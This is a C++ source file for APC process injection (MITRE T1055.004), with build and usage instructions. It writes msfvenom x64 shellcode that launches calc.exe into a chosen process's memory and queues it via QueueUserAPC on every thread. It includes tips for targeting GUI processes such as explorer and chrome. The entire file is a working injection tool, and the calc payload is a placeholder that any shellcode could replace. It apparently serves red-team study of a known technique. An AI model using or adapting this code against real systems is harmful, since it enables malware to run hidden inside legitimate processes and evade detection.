/*
 * APC Injection - QueueUserAPC
 *
 * MITRE ATT&CK: T1055.004 - Asynchronous Procedure Call
 *
 * Fires when any thread of the target enters an alertable wait
 * (SleepEx/WaitFor*Ex with bAlertable=TRUE, MsgWaitForMultipleObjectsEx,
 * GetMessage etc.). For reliability we queue the APC on EVERY thread of
 * the target; the first one that enters an alertable state runs it.
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o apc_inject.exe apc_injection.cpp
 *   cl /std:c++20 apc_injection.cpp /Fe:apc_inject.exe
 *
 * Usage:
 *   apc_inject.exe <PID>
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/*
 * x64 shellcode: WinExec("calc.exe", 0) + ExitThread
 * Generated: msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
 *
 * EXITFUNC=thread so the target process survives after calc fires.
 */
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";


int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        printf("Tip: GUI apps (explorer, notepad, chrome) hit alertable waits often.\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    printf("[*] APC injection -> PID %lu\n", pid);

    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess failed (%lu)\n", GetLastError()); return 1; }

    LPVOID addr = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) { printf("[-] VirtualAllocEx failed\n"); CloseHandle(hProc); return 1; }

    SIZE_T written = 0;
    WriteProcessMemory(hProc, addr, shellcode, sizeof(shellcode), &written);
    printf("[+] Shellcode @ %p (%zu bytes)\n", addr, written);

    /* Enumerate ALL threads of the target and queue the APC on each.
     * First one to enter an alertable wait fires it. */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("[-] Thread snapshot failed\n");
        CloseHandle(hProc);
        return 1;
    }

    THREADENTRY32 te = { .dwSize = sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (!hT) continue;
            if (QueueUserAPC((PAPCFUNC)addr, hT, 0)) queued++;
            CloseHandle(hT);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    if (queued == 0) {
        printf("[-] Could not queue APC on any thread\n");
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] APC queued on %d threads. Waiting for one to enter alertable state...\n", queued);

    /* Give the target a moment to fire. For GUI apps this is usually
     * instant; for CPU-bound daemons it may never fire. */
    Sleep(3000);

    printf("[+] Done. If calc didn't pop, try nudging the target (e.g. click its window).\n");
    CloseHandle(hProc);
    return 0;
}
